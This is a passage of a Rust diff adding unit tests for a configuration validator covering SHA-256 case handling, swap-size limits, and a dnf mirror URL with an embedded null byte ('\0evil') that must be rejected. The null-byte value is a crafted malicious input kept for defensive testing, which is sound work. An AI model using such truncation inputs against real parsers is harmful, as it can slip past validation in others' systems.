+        // uppercase hex is normalised to lowercase before checking
+        let cfg = InjectConfig {
+            expected_sha256: Some(
+                "A948904F2F0F479B8F936B0E0B4A12D4B9D1F2E3C4D5E6F7A8B9C0D1E2F3A4B5".into(),
+            ),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_ok(),
+            "uppercase 64-char hex SHA-256 must pass"
+        );
+    }
+
+    // ── dnf_mirror null byte ───────────────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_dnf_mirror_with_null_byte() {
+        let cfg = InjectConfig {
+            dnf_mirror: Some("https://mirror.example.com/\0evil".into()),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "dnf_mirror with null byte must be rejected"
+        );
+    }
+
+    // ── swap upper bound ───────────────────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_swap_size_exceeding_max() {
+        let cfg = InjectConfig {
+            swap: Some(SwapConfig {
+                size_mb: 200_000,
+                ..Default::default()
+            }),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "swap size > 131072 MB must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_swap_size_at_max_boundary() {
+        let cfg = InjectConfig {
+            swap: Some(SwapConfig {
+                size_mb: 131_072,
+                ..Default::default()
+            }),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_ok(),
+            "swap size exactly 131072 MB must be accepted"
         );
     }
 }
